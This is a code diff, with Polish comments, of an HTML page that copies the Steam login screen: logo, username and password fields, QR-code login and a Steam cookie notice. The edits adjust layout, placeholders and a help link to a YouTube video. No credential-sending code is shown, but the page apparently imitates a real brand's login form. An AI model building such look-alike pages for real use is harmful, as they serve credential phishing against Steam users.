@@ -30,27 +30,28 @@
             position: relative;
         }
 
-        /* LOGO – dokładnie lewy górny róg */
+        /* LOGO – lewy górny róg + większe */
         .logo {
             position: fixed;
-            top: 12px;
-            left: 12px;
+            top: 10px;
+            left: 10px;
             z-index: 100;
         }
         .logo img {
-            width: 140px;
+            width: 190px;          /* było 140px – teraz większe */
             height: auto;
             display: block;
         }
 
-        /* NAPIS DUCZE – POZA OKNEM */
+        /* NAPIS DUCZE – wyrównany do lewej krawędzi okienka */
         .main-title {
+            width: 780px;          /* taka sama szerokość jak panel */
             font-size: 48px;
             font-weight: 700;
             color: #ffffff;
             letter-spacing: 1px;
-            margin-bottom: 22px;
-            text-align: center;
+            margin-bottom: 18px;
+            text-align: left;      /* na lewo */
             text-shadow: 0 2px 12px rgba(0,0,0,0.5);
         }
 
@@ -80,7 +81,6 @@
             font-size: 14px;
             font-weight: 600;
         }
-        /* Pole 1 na niebiesko */
         .field label[for="pole1"] {
             color: #66c0f4;
         }
@@ -260,8 +260,11 @@
         }
 
         @media (max-width: 820px) {
-            .panel {
+            .panel,
+            .main-title {
                 width: calc(100% - 30px);
+            }
+            .panel {
                 flex-direction: column;
             }
             .left, .qr-section {
@@ -272,7 +275,7 @@
                 border-top: 1px solid #292e37;
             }
             .logo img {
-                width: 100px;
+                width: 130px;
             }
             .main-title {
                 font-size: 36px;
@@ -282,27 +285,26 @@
 </head>
 <body>
 
-    <!-- LOGO – lewy górny róg -->
+    <!-- LOGO -->
     <div class="logo">
         <img src="logo.png" alt="Steam">
     </div>
 
-    <!-- NAPIS DUCZE POZA OKNEM -->
+    <!-- NAPIS DUCZE – wyrównany do lewej krawędzi okna -->
     <h1 class="main-title">Logowanie</h1>
 
     <!-- GŁÓWNE OKNO -->
     <div class="panel">
-        <!-- LEWA STRONA -->
         <div class="left">
             <form id="form">
                 <div class="field">
                     <label for="pole1">ZALOGUJ SIĘ Z UŻYCIEM NAZWY KONTA</label>
-                    <input id="pole1" type="text" placeholder="" autocomplete="off">
+                    <input id="pole1" type="text" placeholder="Wpisz tekst..." autocomplete="off">
                 </div>
 
                 <div class="field">
-                    <label for="pole2">HASŁO</label>
-                    <input id="pole2" type="text" placeholder="" autocomplete="off">
+                    <label for="pole2">Hasło</label>
+                    <input id="pole2" type="text" placeholder="Wpisz tekst..." autocomplete="off">
                 </div>
 
                 <label class="remember">
@@ -312,7 +314,7 @@
 
                 <button class="submit" type="submit">Zaloguj się</button>
 
-                <a href="#" class="help-link" onclick="return false;">
+                <a href="https://www.youtube.com/watch?v=QDia3e12czc" class="help-link" target="_blank">
                     Pomocy, nie mogę się zalogować
                 </a>
 
@@ -320,7 +322,6 @@
             </form>
         </div>
 
-        <!-- PRAWA STRONA – QR -->
         <div class="qr-section">
             <div class="qr-title">
                 LUB ZALOGUJ SIĘ Z UŻYCIEM<br>KODU QR
@@ -353,7 +354,7 @@
             Nie używamy wielu ciasteczek. Możesz zobaczyć je i zarządzać nimi
             w dowolnej chwili na stronie.
             Jeżeli klikniesz „Zaakceptuj wszystkie”, będzie to oznaczało
-            wyrażenie zgody na używanie opcjonalnych danych na stronach steam.
+            wyrażenie zgody na używanie opcjonalnych danych na stronach Steam.
             Dowiedz się więcej na temat ciasteczek na naszej stronie.
         </p>
         <div class="cookie-buttons">
